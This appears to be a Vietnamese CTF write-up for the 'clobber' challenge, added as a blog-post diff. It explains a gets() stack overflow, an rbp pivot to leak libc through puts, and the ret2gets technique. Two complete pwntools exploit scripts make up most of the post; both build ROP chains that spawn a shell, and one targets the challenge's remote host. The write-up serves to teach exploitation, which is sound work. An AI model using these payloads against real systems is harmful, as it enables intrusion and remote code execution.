@@ -1,0 +1,250 @@
+--- 
+title: DwngCTF-2025
+date: 2025-02-16 
+description : 'DwngCTF-2025'
+tags: ['rop']
+author: ['kuvee']
+draft: false
+---
+
+
+## clobber
+
+- các bài trước khá dễ nên mình sẽ không đề cập , và bài này khá là vui nên mình sẽ ghi writeup về nó 
+
+
+- nhìn qua thì ta thấy ngay đây chỉ là 1 bài `bof` đơn giản , tuy nhiên bài này sẽ không có các gadget như `pop_rdi` , `pop_rsi` , nên ta phải cần pivot hoặc là sử dụng `ret2gets` 
+
+```c
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  char s[32]; // [rsp+0h] [rbp-20h] BYREF
+
+  setvbuf(_bss_start, 0, 2, 0);
+  setvbuf(stderr, 0, 2, 0);
+  gets(s);
+  puts(s);
+  return 0;
+}
+```
+
+- ý tưởng rất đơn giản , trước khi `puts` thì ta thấy nó sẽ setup 1 số thứ để in ra , và ở đoạn này ta hoàn toàn có thể control được `rbp` -> ta có thể control được dữ liệu mà nó leak ra 
+
+![image](https://hackmd.io/_uploads/rJZhnEX1xx.png)
+
+- ta có thể lựa 1 địa chỉ nào đó chứa địa chỉ libc như `got` hoặc là ta cũng có thể chọn `stdout` , `stdin` , `stderr`  , ở trường hợp này `stderr` có vẻ dễ hơn vì nó không ghi đè bất cứ giá trị quan trọng nào nhưng mình chọn `rbp` này là `got@puts`
+
+
+- trước hết muốn in ra thì ta cần overwrite đoạn mà khi puts xong nó return về , ở đây space mà ta có thể ghi để return về 1 `bss` khác là 50 bytes , vừa đủ để không overwrite dính vào `stdout` 
+
+![image](https://hackmd.io/_uploads/rklA6Emyex.png)
+
+
+- vì vậy mình sẽ setup 1 bss để khi in xong thì nó sẽ return về  và thực hiện một số điều để thõa mãn `one_gadget` :))
+
+```python
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+from subprocess import check_output
+from time import sleep
+
+from pwn import *
+
+context.terminal = [
+    "wt.exe",
+    "-w",
+    "0",
+    "split-pane",
+    "-d",
+    ".",
+    "wsl.exe",
+    "-d",
+    "kali-linux",
+    "--",
+    "bash",
+    "-c",
+]
+context.update(arch="amd64", os="linux")
+context.log_level = "debug"
+exe = context.binary = ELF("./clobber_patched", checksec=False)
+libc = exe.libc
+log_levels = ["info", "error", "warn", "debug"]
+info = lambda msg: log.info(msg)
+error = lambda msg: log.error(msg)
+warn = lambda msg: log.warn(msg)
+debug = lambda msg: log.debug(msg)
+
+
+def one_gadget(filename, base_addr=0):
+    return [
+        (int(i) + base_addr)
+        for i in subprocess.check_output(["one_gadget", "--raw", "-l0", filename])
+        .decode()
+        .split(" ")
+    ]
+
+
+info = lambda msg: log.info(msg)
+s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
+sa = lambda msg, data, proc=None: (
+    proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
+)
+sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
+sla = lambda msg, data, proc=None: (
+    proc.p.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
+)
+sn = lambda num, proc=None: (
+    proc.send(str(num).encode()) if proc else p.send(str(num).encode())
+)
+sna = lambda msg, num, proc=None: (
+    proc.sendafter(msg, str(num).encode())
+    if proc
+    else p.sendafter(msg, str(num).encode())
+)
+sln = lambda num, proc=None: (
+    proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
+)
+slna = lambda msg, num, proc=None: (
+    proc.sendlineafter(msg, str(num).encode())
+    if proc
+    else p.sendlineafter(msg, str(num).encode())
+)
+
+
+def logbase():
+    log.info("libc base = %#x" % libc.address)
+
+
+def rcu(d1, d2=0):
+    p.recvuntil(d1, drop=True)
+    # return data between d1 and d2
+    if d2:
+        return p.recvuntil(d2, drop=True)
+
+
+def start(argv=[], *a, **kw):
+    if args.GDB:
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
+    elif args.REMOTE:
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    elif args.DOCKER:
+        p = remote("localhost", 5000)
+        sleep(1)
+        pid = int(check_output(["pidof", "-s", "/app/run"]))
+        gdb.attach(
+            int(pid),
+            gdbscript=gdbscript
+            + f"\n set sysroot /proc/{pid}/root\nfile /proc/{pid}/exe",
+            exe=exe.path,
+        )
+        pause()
+        return p
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+
+gdbscript = """
+b*0x00000000004011CA
+b*0x00000000004011D6
+b*0x00000000004011E1
+c
+"""
+
+p = start()
+
+# ==================== EXPLOIT ====================
+
+
+def exploit():
+    leave_ret = 0x00000000004011E0
+    bss = 0x404000 + 0x600
+    bss2 = 0x404000 + 0x400
+    bss = 0x405000 - 0x100
+    gets = 0x00000000004011BE
+    puts = 0x4011CF
+    stdout = 0x404040
+
+    pl = flat(b"a" * 32, p64(0x404400 - 16), gets)
+    sl(pl)
+
+    pl1 = (
+        b"a" * 32
+        + p64(0x404010 + 0x20)
+        + p64(gets)
+        + p64(exe.got.puts + 0x20)
+        + p64(puts)
+        + b"a" * 0x10
+        + p64(0x404430 + 0x20)
+        + p64(gets)
+    )
+    sl(pl1)
+    pl2 = b"a" * 0x10 + p64(bss2 + 0x20) + p64(leave_ret) + p64(bss2) + p32(leave_ret)
+    sl(pl2)
+    # pl3 = flat(b"a" * 0x20, exe.got.puts + 0x20, gets)
+    info("payload3")
+    # sl(pl3)
+
+    p.recvlines(3)
+    libc.address = u64(p.recv(6).ljust(8, b"\x00")) - libc.sym.puts
+    logbase()
+    pop_rdi = 0x000000000002A885 + libc.address
+    binsh = next(libc.search(b"/bin/sh\x00"))
+    pop_r12 = 0x0000000000028A82 + libc.address
+    final = flat(b"c" * 32, bss2, pop_rdi, 0, pop_r12, 0, libc.address + 0xD0775)
+
+    input()
+    sl(final)
+
+    p.interactive()
+
+
+if __name__ == "__main__":
+    exploit()
+```
+
+- 1 cách khác là sử dụng `ret2gets` , cái này khá rắc rối nên ta có thể hiểu là khi sử dụng `gets` thì nó sẽ để lại 1 địa chỉ libc ở `rdi` và thằng này sẽ là `_IO_stdfile_0_lock`
+
+![image](https://hackmd.io/_uploads/rkc9lBmJxx.png)
+
+- và ở đây giải thích khá chi tiết
+
+![image](https://hackmd.io/_uploads/HyxY-Bmkel.png)
+
+exp
+
+```python
+from pwn import *
+
+context.terminal = "kitty"
+elf = context.binary = ELF("./clobber_patched")
+libc = ELF("./libc.so.6")
+r = remote("clobber.umbccd.net", 13373)
+
+payload = b"a" * 0x20
+payload += p64(0x0)
+payload += p64(elf.plt["gets"])
+payload += p64(elf.plt["gets"])
+payload += p64(elf.plt["gets"])
+payload += p64(elf.plt["puts"])
+payload += p64(elf.sym["main"])
+r.sendline(payload)
+
+r.sendline(b"\x01")
+r.sendline(p32(0x0) + b"A" * 4 + b"B" * 8)
+r.sendline(b"CCCC")
+
+r.recvline()
+r.recv(8)
+tls = u64(r.recv(6).ljust(8, b"\x00"))
+libc.address = tls + 0x28c0
+print("libc @", hex(libc.address))
+
+payload = b"a" * 0x28
+payload += p64(next(libc.search(asm("pop rdi; ret;"), executable=True)))
+payload += p64(next(libc.search(b"/bin/sh\x00")))
+payload += p64(libc.sym["system"])
+
+r.sendline(payload)
+
+r.interactive()
+```
